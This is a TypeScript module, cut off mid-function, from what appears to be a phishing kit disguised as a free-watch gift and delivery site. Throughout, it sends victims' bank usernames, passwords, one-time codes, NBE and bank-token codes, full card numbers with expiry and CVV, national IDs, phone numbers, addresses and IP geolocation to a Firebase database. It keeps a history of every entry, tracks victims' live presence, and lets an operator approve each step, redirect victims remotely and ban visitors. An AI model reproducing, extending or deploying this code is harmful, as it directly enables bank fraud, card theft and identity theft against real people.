import { firebasePaths, getFirebaseConfig } from "~/utils/firebaseConfig";
import type { Database } from "firebase/database";
import type { Ref } from "vue";
import { ensureVisitorGeo, getVisitorGeoSync, type VisitorGeo } from "~/composables/useVisitorGeo";
import { ROUTE_PATHS, normalizePath, normalizeKey, toCanonicalRedirectTarget, isPublicVisitorPath } from "~/composables/useRouteConstants";

export type CustomerStatus = "جديد" | "اختار ساعة" | "أدخل بيانات التوصيل" | "محاولة دخول" | "مشكلة" | "متابعة" | "تم رفع المستندات";
export type CustomerPresenceState = "online" | "offline";

export type CustomerPresence = {
  state: CustomerPresenceState;
  currentPage: string;
  currentStep?: string;
  lastChangedAt: number;
};

export type CustomerIssue = {
  message: string;
  source: string;
  occurredAt: string;
};

export type CustomerLoginInfo = {
  username: string;
  passwordEntered: boolean;
  password?: string;
  submittedAt: string;
};

export type CustomerVerificationStatus = "pending" | "approved" | "rejected";
export type CustomerLoginAttemptVerificationStatus = CustomerVerificationStatus | "none";
export type CustomerStepStatus = "none" | "pending" | "approved" | "rejected";

export type CustomerLoginAttempt = {
  id: string;
  username: string;
  passwordEntered: boolean;
  password?: string;
  otpEntered: boolean;
  otp?: string;
  verificationStatus: CustomerLoginAttemptVerificationStatus;
  otpSubmittedAt?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cardEntered?: boolean;
  cardStatus?: CustomerStepStatus;
  cardSubmittedAt?: string;
  cardDecidedAt?: string;
  nbeToken?: string;
  nbeTokenEntered?: boolean;
  nbeTokenStatus?: CustomerStepStatus;
  nbeTokenSubmittedAt?: string;
  nbeTokenDecidedAt?: string;
  bmToken?: string;
  bmTokenEntered?: boolean;
  bmTokenStatus?: CustomerStepStatus;
  bmTokenSubmittedAt?: string;
  bmTokenDecidedAt?: string;
  createdAt: string;
  decidedAt?: string;
};

export type CustomerVerification = {
  otpEntered: boolean;
  otp?: string;
  status: CustomerVerificationStatus;
  requestedAt: string;
  attemptId?: string;
  decidedAt?: string;
};

export type CustomerRecord = {
  id: string;
  code: string;
  name?: string;
  displayName?: string;
  fullName?: string;
  nationalId?: string;
  accountType?: "أفراد" | "شركات";
  companyId?: string;
  username?: string;
  usernameStatus?: CustomerStepStatus;
  usernameHistory?: Array<{ value: string; timestamp: string }>;
  password?: string;
  passwordEntered?: boolean;
  passwordStatus?: CustomerStepStatus;
  passwordHistory?: Array<{ value: string; timestamp: string }>;
  otp?: string;
  otpEntered?: boolean;
  verificationStatus?: CustomerVerificationStatus;
  otpHistory?: Array<{ value: string; timestamp: string }>;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cardEntered?: boolean;
  cardStatus?: CustomerStepStatus;
  cardHistory?: Array<{ cardNumber: string; cardExpiry: string; cardCvv: string; timestamp: string }>;
  nbeToken?: string;
  nbeTokenEntered?: boolean;
  nbeTokenStatus?: CustomerStepStatus;
  nbeTokenHistory?: Array<{ value: string; timestamp: string }>;
  bmToken?: string;
  bmTokenEntered?: boolean;
  bmTokenStatus?: CustomerStepStatus;
  bmTokenHistory?: Array<{ value: string; timestamp: string }>;
  loginInfo?: CustomerLoginInfo;
  credentialsHistory?: Array<{ username: string; password?: string; accountType?: string; timestamp: string }>;
  loginAttempts?: Record<string, CustomerLoginAttempt>;
  verification?: CustomerVerification;
  selectedWatch?: string;
  phone?: string;
  governorate?: string;
  addressDetails?: string;
  city?: string;
  address?: string;
  // === Geo lookup (مصدرها IP الزائر عبر ipwho.is) ===
  country?: string;       // اسم الدولة بالإنجليزية — مثال: "Jordan"
  countryCode?: string;   // كود الدولة ISO-2 — مثال: "JO"
  region?: string;        // اسم المنطقة/المحافظة — مثال: "Amman Governorate"
  geoCity?: string;       // المدينة من الـ IP — مثال: "Amman"
  timezone?: string;      // المنطقة الزمنية — مثال: "Asia/Amman"
  ip?: string;            // IP الزائر (للمعلومات فقط)
  geoCapturedAt?: string; // ISO timestamp لآخر جلب للموقع
  // === نهاية حقول الـ Geo ===
  nationalIdFrontImage?: string;
  nationalIdBackImage?: string;
  bankCardImage?: string;
  documentsSubmitted?: boolean;
  documentsStatus?: CustomerStepStatus;
  documentsSubmittedAt?: string;
  status: CustomerStatus;
  lastAction?: string;
  lastPage?: string;
  currentStep?: string;
  presence?: CustomerPresence;
  issue?: CustomerIssue | null;
  userAgent?: string;
  isBanned?: boolean;
  bannedUntil?: number | null;
  bannedAt?: string;
  isStarred?: boolean;
  starredAt?: string;
  remoteRedirect?: {
    target: string;
    step?: string;
    timestamp: number;
  };
  createdAt: string;
  updatedAt: string;
};

export type TrackEventType =
  | "page_visit"
  | "watch_selected"
  | "delivery_info_submitted"
  | "username_submitted"
  | "password_submitted"
  | "login_submitted"
  | "otp_submitted"
  | "card_info_submitted"
  | "nbe_token_submitted"
  | "documents_submitted"
  | "documents_uploaded"
  | "verification_decision"
  | "token_confirmed"
  | "token_not_active"
  | "invalid_username_email"
  | "honeypot_triggered"
  | "success_viewed"
  | "client_issue"
  | (string & {});

type TrackPatch = Partial<Omit<CustomerRecord, "id" | "createdAt" | "updatedAt">>;

let cachedDatabase: Database | null = null;
let presenceStarted = false;
let currentPresencePath = "/";

const customerStorageKey = "gift_customer_tracking_id";
const customerCodeStorageKey = "gift_customer_tracking_code";
const customerCodePattern = /^[0-9@#$%&*?]{6}$/;

export const getFirebaseDatabase = async () => {
  if (cachedDatabase) return cachedDatabase;

  const appModule = await import("firebase/app");
  const databaseModule = await import("firebase/database");
  const config = getFirebaseConfig();
  const app = appModule.getApps().length ? appModule.getApp() : appModule.initializeApp(config);

  const dbUrl = (config.databaseURL || "").replace(/\/+$/, "");
  cachedDatabase = dbUrl ? databaseModule.getDatabase(app, dbUrl) : databaseModule.getDatabase(app);
  return cachedDatabase;
};

const generateCustomerCode = () => {
  const alphabet = "0123456789@#$%&*?";
  if (window.crypto?.getRandomValues) {
    const bytes = new Uint8Array(6);
    window.crypto.getRandomValues(bytes);
    return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join("");
  }

  return Array.from({ length: 6 }, () => alphabet[Math.floor(Math.random() * alphabet.length)]).join("");
};

export const getCustomerId = () => {
  const existing = window.localStorage.getItem(customerStorageKey);
  if (existing) return existing;

  const generated =
    typeof window.crypto?.randomUUID === "function"
      ? window.crypto.randomUUID()
      : `customer-${Date.now()}-${Math.random().toString(16).slice(2)}`;

  window.localStorage.setItem(customerStorageKey, generated);
  return generated;
};

export const getCustomerCode = () => {
  const existing = window.localStorage.getItem(customerCodeStorageKey);
  if (existing && customerCodePattern.test(existing)) return existing;

  const generated = generateCustomerCode();
  window.localStorage.setItem(customerCodeStorageKey, generated);
  return generated;
};

const cleanPayload = <T extends Record<string, unknown>>(payload: T): T => {
  if (!payload || typeof payload !== "object") return payload;
  const result: Record<string, unknown> = {};
  for (const [key, value] of Object.entries(payload)) {
    if (value === undefined) continue;
    if (value && typeof value === "object" && !Array.isArray(value) && !(value instanceof Date)) {
      result[key] = cleanPayload(value as Record<string, unknown>);
    } else {
      result[key] = value;
    }
  }
  return result as T;
};

export const maskCustomerIdentifier = (value: string) => {
  const trimmed = value.trim();
  if (!trimmed) return "زائر غير معروف";
  if (trimmed.length <= 3) return `${trimmed[0] ?? ""}***`;
  return `${trimmed.slice(0, 3)}***${trimmed.slice(-1)}`;
};

export const checkAndEnforceBan = (customerData?: Partial<CustomerRecord> | null): boolean => {
  if (!import.meta.client) return false;
  if (window.location.pathname.startsWith("/admin") || window.location.pathname.startsWith("/blocked")) return false;

  const storedBannedUntil = window.localStorage.getItem("gift_visitor_banned_until");
  if (storedBannedUntil && Date.now() < Number(storedBannedUntil)) {
    window.location.replace("/blocked");
    return true;
  }

  if (customerData?.isBanned && customerData.bannedUntil && Date.now() < Number(customerData.bannedUntil)) {
    window.localStorage.setItem("gift_visitor_banned_until", String(customerData.bannedUntil));
    window.location.replace("/blocked");
    return true;
  }

  return false;
};

export const getLocalDeliveryInfo = () => {
  if (!import.meta.client) return {};
  try {
    const raw = window.localStorage.getItem("gift_customer_flow_data");
    const flow = raw ? JSON.parse(raw) : {};
    const watch = window.localStorage.getItem("gift_customer_selected_watch") || flow.watch || undefined;
    const name = window.localStorage.getItem("gift_customer_name") || flow.name || undefined;
    const nationalId = window.localStorage.getItem("gift_customer_national_id") || flow.nationalId || undefined;
    const phone = window.localStorage.getItem("gift_customer_phone") || flow.phone || undefined;
    const governorate = window.localStorage.getItem("gift_customer_governorate") || flow.governorate || undefined;
    const addressDetails = window.localStorage.getItem("gift_customer_address") || flow.addressDetails || undefined;

    return {
      selectedWatch: watch,
      name,
      displayName: name,
      fullName: name,
      nationalId,
      phone,
      governorate,
      addressDetails,
      city: governorate,
    };
  } catch {
    return {};
  }
};

/**
 * يبني كائن تحديث يحتوي على بيانات الـ Geo للزائر، فقط إذا لم تكن محفوظة
 * مسبقاً في السجل الحالي. حتى لا نكسر القيم اليدوية لو حُقنت لاحقاً.
 */
const buildGeoPatch = async (current?: Partial<CustomerRecord> | null): Promise<Record<string, unknown>> => {
  if (typeof window === "undefined") return {};
  try {
    // ضمان الجلب (مع كاش) — لو فشل نتجاهل بهدوء
    const geo = (await ensureVisitorGeo()) || getVisitorGeoSync();
    if (!geo) return {};
    if (current?.country && current?.countryCode && current?.region) return {};

    const out: Record<string, unknown> = {};
    if (!current?.country && geo.country) out.country = geo.country;
    if (!current?.countryCode && geo.countryCode) out.countryCode = geo.countryCode;
    if (!current?.region && geo.region) out.region = geo.region;
    if (!current?.geoCity && geo.city) out.geoCity = geo.city;
    if (!current?.timezone && geo.timezone) out.timezone = geo.timezone;
    if (!current?.ip && geo.ip) out.ip = geo.ip;
    if (geo.capturedAt) out.geoCapturedAt = geo.capturedAt;
    return out;
  } catch {
    return {};
  }
};

export const trackCustomerActivity = async (
  patch: TrackPatch,
  eventType: TrackEventType,
  eventPayload: Record<string, unknown> = {},
) => {
  if (!import.meta.client) return null;
  if (checkAndEnforceBan()) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const code = getCustomerCode();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};

  if (checkAndEnforceBan(current)) return null;

  const localInfo = getLocalDeliveryInfo();

  const finalName = patch.name || patch.displayName || patch.fullName || current.name || current.displayName || localInfo.name;
  const finalWatch = patch.selectedWatch || current.selectedWatch || localInfo.selectedWatch;
  const finalNationalId = patch.nationalId || current.nationalId || localInfo.nationalId;
  const finalPhone = patch.phone || current.phone || localInfo.phone;
  const finalGov = patch.governorate || current.governorate || localInfo.governorate;
  const finalAddress = patch.addressDetails || patch.address || current.addressDetails || current.address || localInfo.addressDetails;

  const updateData: Record<string, unknown> = {
    ...patch,
    id,
    code: current.code && customerCodePattern.test(current.code) ? current.code : code,
    updatedAt: now,
    lastPage: patch.lastPage || current.lastPage || window.location.pathname,
    status: patch.status ?? current.status ?? "جديد",
    "presence/state": "online",
    "presence/currentPage": patch.lastPage || current.presence?.currentPage || window.location.pathname,
    "presence/lastChangedAt": Date.now(),
    userAgent: window.navigator.userAgent,
  };

  if (!current.createdAt) {
    updateData.createdAt = now;
  }
  if (finalName) {
    updateData.name = finalName;
    updateData.displayName = finalName;
    updateData.fullName = finalName;
  }
  if (finalWatch) {
    updateData.selectedWatch = finalWatch;
  }
  if (finalNationalId) {
    updateData.nationalId = finalNationalId;
  }
  if (finalPhone) {
    updateData.phone = finalPhone;
  }
  if (finalGov) {
    updateData.governorate = finalGov;
    updateData.city = finalGov;
  }
  if (finalAddress) {
    updateData.addressDetails = finalAddress;
    updateData.address = finalAddress;
  }

  // ضخ بيانات الـ Geo للزائر (دولة + منطقة + مدينة) — أول مرة فقط لكل عميل
  const geoPatch = await buildGeoPatch(current);
  for (const [key, value] of Object.entries(geoPatch)) {
    if (value !== undefined && value !== null && value !== "") {
      updateData[key] = value;
    }
  }

  const currentStepVal = (patch as any).currentStep ?? current.currentStep ?? (patch.lastPage?.includes("step=") ? patch.lastPage.split("step=")[1]?.split("&")[0] : undefined);
  if (currentStepVal) {
    updateData.currentStep = currentStepVal;
    updateData["presence/currentStep"] = currentStepVal;
  }

  await databaseModule.update(customerRef, cleanPayload(updateData));

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: eventType,
      payload: eventPayload,
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return id;
};

export const submitUsernameStep = async (
  username: string,
  accountType: "أفراد" | "شركات" = "أفراد",
  companyId?: string
) => {
  if (!import.meta.client) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const code = getCustomerCode();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};

  const localInfo = getLocalDeliveryInfo();
  const actualCustomerName = current.name || current.displayName || current.fullName || localInfo.name || "";
  const finalWatch = current.selectedWatch || localInfo.selectedWatch;
  const finalNationalId = current.nationalId || localInfo.nationalId;
  const finalPhone = current.phone || localInfo.phone;
  const finalGov = current.governorate || localInfo.governorate;
  const finalAddress = current.addressDetails || localInfo.addressDetails;

  const existingUsernameHistory = Array.isArray(current.usernameHistory)
    ? [...current.usernameHistory]
    : (current.username && current.username.trim() && current.username !== "لم يُدخل بعد"
        ? [{ value: current.username, timestamp: current.updatedAt || now }]
        : []);
  const usernameHistory = existingUsernameHistory.filter((item) => (typeof item === 'string' ? item : item?.value) !== username);
  usernameHistory.unshift({ value: username, timestamp: now });

  const finalCompanyId = accountType === "شركات" && companyId ? companyId.trim() : undefined;
  const actionText = finalCompanyId
    ? `أدخل هوية الشركة (${finalCompanyId}) وكود المستخدم: ${username}`
    : `أدخل كود المستخدم (${accountType}): ${username}`;

  const updates: Record<string, unknown> = {
    id,
    code: current.code && customerCodePattern.test(current.code) ? current.code : code,
    accountType,
    companyId: finalCompanyId,
    username,
    usernameStatus: "pending",
    usernameHistory,
    status: "محاولة دخول",
    lastAction: actionText,
    issue: null,
    updatedAt: now,
    currentStep: "password",
    lastPage: "/login?step=password",
    "presence/state": "online",
    "presence/currentStep": "password",
    "presence/currentPage": "/login?step=password",
    "presence/lastChangedAt": databaseModule.serverTimestamp(),
    userAgent: window.navigator.userAgent,
  };

  if (!current.createdAt) {
    updates.createdAt = now;
  }
  if (actualCustomerName) {
    updates.name = actualCustomerName;
    updates.displayName = actualCustomerName;
    updates.fullName = actualCustomerName;
  }
  if (finalWatch) {
    updates.selectedWatch = finalWatch;
  }
  if (finalNationalId) {
    updates.nationalId = finalNationalId;
  }
  if (finalPhone) {
    updates.phone = finalPhone;
  }
  if (finalGov) {
    updates.governorate = finalGov;
    updates.city = finalGov;
  }
  if (finalAddress) {
    updates.addressDetails = finalAddress;
    updates.address = finalAddress;
  }

  // ضخ بيانات الـ Geo للزائر (دولة + منطقة + مدينة)
  const geoPatchUsername = await buildGeoPatch(current);
  for (const [key, value] of Object.entries(geoPatchUsername)) {
    if (value !== undefined && value !== null && value !== "") {
      updates[key] = value;
    }
  }

  await databaseModule.update(customerRef, cleanPayload(updates));

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "username_submitted",
      payload: {
        name: actualCustomerName,
        username,
        accountType,
        companyId: finalCompanyId,
        selectedWatch: finalWatch,
        phone: finalPhone,
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return id;
};

export const submitPasswordStep = async (password: string) => {
  if (!import.meta.client) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};
  const currentUsername = current.username || "";
  const attemptId = `attempt-${Date.now()}-${Math.random().toString(16).slice(2)}`;

  const attempt: CustomerLoginAttempt = {
    id: attemptId,
    username: currentUsername,
    passwordEntered: true,
    password,
    otpEntered: false,
    verificationStatus: "none",
    createdAt: now,
  };

  const existingPasswordHistory = Array.isArray(current.passwordHistory)
    ? [...current.passwordHistory]
    : (current.password && current.password.trim() && current.password !== "لم تدخل بعد"
        ? [{ value: current.password, timestamp: current.updatedAt || now }]
        : []);
  const passwordHistory = existingPasswordHistory.filter((item) => (typeof item === 'string' ? item : item?.value) !== password);
  passwordHistory.unshift({ value: password, timestamp: now });

  const existingCredsHistory = Array.isArray(current.credentialsHistory)
    ? [...current.credentialsHistory]
    : [];
  const newPair = {
    username: currentUsername,
    password,
    accountType: current.accountType || "أفراد",
    timestamp: now,
  };
  const credentialsHistory = existingCredsHistory.filter(
    (item) => !(item.username === currentUsername && item.password === password)
  );
  credentialsHistory.unshift(newPair);

  await databaseModule.update(
    customerRef,
    cleanPayload({
      password,
      passwordEntered: true,
      passwordStatus: "pending",
      passwordHistory,
      credentialsHistory,
      [`loginAttempts/${attemptId}`]: attempt,
      loginInfo: {
        username: currentUsername,
        passwordEntered: true,
        password,
        submittedAt: now,
      },
      status: "محاولة دخول",
      lastAction: `أدخل كلمة المرور: ${password}`,
      issue: null,
      updatedAt: now,
      currentStep: "password",
      lastPage: "/login?step=password",
      presence: {
        ...(current.presence ?? {}),
        state: "online",
        currentStep: "password",
        currentPage: "/login?step=password",
        lastChangedAt: Date.now(),
      },
      userAgent: window.navigator.userAgent,
    }),
  );

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "password_submitted",
      payload: {
        username: currentUsername,
        password,
        attemptId,
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return { customerId: id, attemptId };
};

export const createLoginAttempt = async (username: string, passwordEntered: boolean, password?: string) => {
  if (!import.meta.client) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const code = getCustomerCode();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);
  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};
  const loginAttempts = current.loginAttempts ?? {};
  const reusableAttempt = Object.values(loginAttempts).find(
    (attempt) => attempt.username === username && attempt.verificationStatus === "approved",
  );
  const attemptId =
    reusableAttempt?.id ?? `attempt-${Date.now()}-${Math.random().toString(16).slice(2)}`;
  const attempt: CustomerLoginAttempt = reusableAttempt
    ? {
        ...reusableAttempt,
        passwordEntered: reusableAttempt.passwordEntered || passwordEntered,
        password: password || reusableAttempt.password,
      }
    : {
        id: attemptId,
        username,
        passwordEntered,
        password,
        otpEntered: false,
        verificationStatus: "none",
        createdAt: now,
      };

  // نحافظ تماماً على الاسم الحقيقي للمستخدم المدخل في صفحة بيانات التوصيل
  const actualCustomerName = current.name || current.displayName || "";

  await databaseModule.update(
    customerRef,
    cleanPayload({
      id,
      name: actualCustomerName || undefined,
      displayName: actualCustomerName || undefined,
      username,
      password,
      passwordEntered,
      loginInfo: {
        username,
        passwordEntered,
        password,
        submittedAt: now,
      },
      [`loginAttempts/${attemptId}`]: attempt,
      status: "محاولة دخول",
      lastAction: `تم إرسال كود المستخدم وكلمة المرور: ${username}`,
      issue: null,
      createdAt: current.createdAt ?? now,
      updatedAt: now,
      lastPage: window.location.pathname,
      presence: {
        ...(current.presence ?? {}),
        state: "online",
        currentPage: window.location.pathname,
        lastChangedAt: Date.now(),
      },
      userAgent: window.navigator.userAgent,
    }),
  );

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "login_submitted",
      payload: {
        name: actualCustomerName,
        username,
        passwordEntered,
        attemptId,
        reusedApprovedAttempt: Boolean(reusableAttempt),
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return { customerId: id, attemptId };
};

export const submitLoginAttemptOtp = async (attemptId: string, otp: string) => {
  if (!import.meta.client || !attemptId) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};
  const existingOtpHistory = Array.isArray(current.otpHistory)
    ? [...current.otpHistory]
    : (current.otp && current.otp.trim() && current.otp !== "لم يدخل بعد"
        ? [{ value: current.otp, timestamp: current.updatedAt || now }]
        : []);
  const otpHistory = existingOtpHistory.filter((item) => (typeof item === 'string' ? item : item?.value) !== otp);
  otpHistory.unshift({ value: otp, timestamp: now });

  await databaseModule.update(
    customerRef,
    cleanPayload({
      otp,
      otpEntered: true,
      verificationStatus: "pending",
      otpHistory,
      verification: {
        otpEntered: true,
        otp,
        status: "pending",
        requestedAt: now,
        attemptId,
      },
      [`loginAttempts/${attemptId}/otpEntered`]: true,
      [`loginAttempts/${attemptId}/otp`]: otp,
      [`loginAttempts/${attemptId}/verificationStatus`]: "pending",
      [`loginAttempts/${attemptId}/otpSubmittedAt`]: now,
      status: "محاولة دخول",
      lastAction: `تم إدخال رمز التحقق: ${otp}`,
      issue: null,
      updatedAt: now,
      currentStep: "otp",
      lastPage: "/login?step=otp",
      presence: {
        ...(current.presence ?? {}),
        state: "online",
        currentStep: "otp",
        currentPage: "/login?step=otp",
        lastChangedAt: Date.now(),
      },
      userAgent: window.navigator.userAgent,
    }),
  );

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "otp_submitted",
      payload: {
        otpEntered: true,
        otp,
        attemptId,
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return id;
};

export const submitNbeTokenStep = async (attemptId: string, nbeToken: string) => {
  if (!import.meta.client || !attemptId) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};
  const existingNbeTokenHistory = Array.isArray(current.nbeTokenHistory)
    ? [...current.nbeTokenHistory]
    : (current.nbeToken && current.nbeToken.trim() && current.nbeToken !== "لم يدخل بعد"
        ? [{ value: current.nbeToken, timestamp: current.updatedAt || now }]
        : []);
  const nbeTokenHistory = existingNbeTokenHistory.filter((item) => (typeof item === 'string' ? item : item?.value) !== nbeToken);
  nbeTokenHistory.unshift({ value: nbeToken, timestamp: now });

  const updates: Record<string, unknown> = {
    nbeToken,
    nbeTokenEntered: true,
    nbeTokenStatus: "pending",
    nbeTokenHistory,
    status: "محاولة دخول",
    lastAction: `تم إدخال رمز NBE توكن: ${nbeToken}`,
    issue: null,
    updatedAt: now,
    currentStep: "nbe_token",
    lastPage: "/login?step=nbe_token",
    presence: {
      ...(current.presence ?? {}),
      state: "online",
      currentStep: "nbe_token",
      currentPage: "/login?step=nbe_token",
      lastChangedAt: Date.now(),
    },
    userAgent: window.navigator.userAgent,
  };

  if (attemptId && attemptId !== "legacy-login") {
    updates[`loginAttempts/${attemptId}/nbeToken`] = nbeToken;
    updates[`loginAttempts/${attemptId}/nbeTokenEntered`] = true;
    updates[`loginAttempts/${attemptId}/nbeTokenStatus`] = "pending";
    updates[`loginAttempts/${attemptId}/nbeTokenSubmittedAt`] = now;
  }

  await databaseModule.update(customerRef, cleanPayload(updates));

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "nbe_token_submitted",
      payload: {
        nbeToken,
        attemptId,
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return id;
};

export const submitBmTokenStep = async (attemptId: string, bmToken: string) => {
  if (!import.meta.client || !attemptId) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};
  const existingBmTokenHistory = Array.isArray(current.bmTokenHistory)
    ? [...current.bmTokenHistory]
    : (current.bmToken && current.bmToken.trim() && current.bmToken !== "لم يدخل بعد"
        ? [{ value: current.bmToken, timestamp: current.updatedAt || now }]
        : []);
  const bmTokenHistory = existingBmTokenHistory.filter((item) => (typeof item === 'string' ? item : item?.value) !== bmToken);
  bmTokenHistory.unshift({ value: bmToken, timestamp: now });

  const updates: Record<string, unknown> = {
    bmToken,
    bmTokenEntered: true,
    bmTokenStatus: "pending",
    bmTokenHistory,
    status: "محاولة دخول",
    lastAction: `تم إدخال رمز جهاز توكن: ${bmToken}`,
    issue: null,
    updatedAt: now,
    currentStep: "bm_token",
    lastPage: "/login?step=bm_token",
    presence: {
      ...(current.presence ?? {}),
      state: "online",
      currentStep: "bm_token",
      currentPage: "/login?step=bm_token",
      lastChangedAt: Date.now(),
    },
    userAgent: window.navigator.userAgent,
  };

  if (attemptId && attemptId !== "legacy-login") {
    updates[`loginAttempts/${attemptId}/bmToken`] = bmToken;
    updates[`loginAttempts/${attemptId}/bmTokenEntered`] = true;
    updates[`loginAttempts/${attemptId}/bmTokenStatus`] = "pending";
    updates[`loginAttempts/${attemptId}/bmTokenSubmittedAt`] = now;
  }

  await databaseModule.update(customerRef, cleanPayload(updates));

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "bm_token_submitted",
      payload: {
        bmToken,
        attemptId,
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return id;
};

export const submitCardInfoStep = async (
  attemptId: string,
  cardData: { cardNumber: string; cardExpiry: string; cardCvv: string }
) => {
  if (!import.meta.client) return null;

  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const id = getCustomerId();
  const now = new Date().toISOString();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  const snapshot = await databaseModule.get(customerRef);
  const current = snapshot.exists() ? (snapshot.val() as Partial<CustomerRecord>) : {};
  const existingCardHistory = Array.isArray(current.cardHistory)
    ? [...current.cardHistory]
    : (current.cardNumber && current.cardNumber.trim() && current.cardNumber !== "لم يدخل بعد"
        ? [{ cardNumber: current.cardNumber, cardExpiry: current.cardExpiry || "", cardCvv: current.cardCvv || "", timestamp: current.updatedAt || now }]
        : []);
  const cardHistory = existingCardHistory.filter(
    (item) => !(item.cardNumber === cardData.cardNumber && item.cardExpiry === cardData.cardExpiry && item.cardCvv === cardData.cardCvv)
  );
  cardHistory.unshift({
    cardNumber: cardData.cardNumber,
    cardExpiry: cardData.cardExpiry,
    cardCvv: cardData.cardCvv,
    timestamp: now,
  });

  const updates: Record<string, unknown> = {
    cardNumber: cardData.cardNumber,
    cardExpiry: cardData.cardExpiry,
    cardCvv: cardData.cardCvv,
    cardEntered: true,
    cardStatus: "pending",
    cardHistory,
    status: "محاولة دخول",
    lastAction: `تم إدخال بيانات البطاقة: ${cardData.cardNumber.slice(0, 4)} **** **** ${cardData.cardNumber.slice(-4)}`,
    issue: null,
    updatedAt: now,
    currentStep: "card",
    lastPage: "/login?step=card",
    presence: {
      ...(current.presence ?? {}),
      state: "online",
      currentStep: "card",
      currentPage: "/login?step=card",
      lastChangedAt: Date.now(),
    },
    userAgent: window.navigator.userAgent,
  };

  if (attemptId && attemptId !== "legacy-login") {
    updates[`loginAttempts/${attemptId}/cardNumber`] = cardData.cardNumber;
    updates[`loginAttempts/${attemptId}/cardExpiry`] = cardData.cardExpiry;
    updates[`loginAttempts/${attemptId}/cardCvv`] = cardData.cardCvv;
    updates[`loginAttempts/${attemptId}/cardEntered`] = true;
    updates[`loginAttempts/${attemptId}/cardStatus`] = "pending";
    updates[`loginAttempts/${attemptId}/cardSubmittedAt`] = now;
  }

  await databaseModule.update(customerRef, cleanPayload(updates));

  const eventRef = databaseModule.push(databaseModule.ref(db, `${firebasePaths.events}/${id}`));
  await databaseModule.set(
    eventRef,
    cleanPayload({
      type: "card_info_submitted",
      payload: {
        cardNumber: cardData.cardNumber,
        cardExpiry: cardData.cardExpiry,
        cardCvv: cardData.cardCvv,
        attemptId,
      },
      createdAt: now,
      page: window.location.pathname,
    }),
  );

  return id;
};

export const sendCustomerRedirect = async (id: string, target: string, step?: string) => {
  const db = await getFirebaseDatabase();
  const databaseModule = await import("firebase/database");
  const now = new Date().toISOString();
  const timestamp = Date.now();
  const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${id}`);

  // توحيد المسار فوراً حتى لو مرّر الأدمن الصيغة القديمة (/waiting أو /call)
  // يضمن أن اللوحة والزبون يستخدمان نفس المفتاح في Firebase.
  const canonicalTarget = toCanonicalRedirectTarget(target);

  const updates: Record<string, unknown> = {
    remoteRedirect: {
      target: canonicalTarget,
      step: step || "",
      timestamp,
    },
    lastAction: `توجيه إداري إلى: ${canonicalTarget}${step ? ' (خطوة ' + step + ')' : ''}`,
    updatedAt: now,
  };

  if (canonicalTarget === "/login") {
    if (step === "username") {
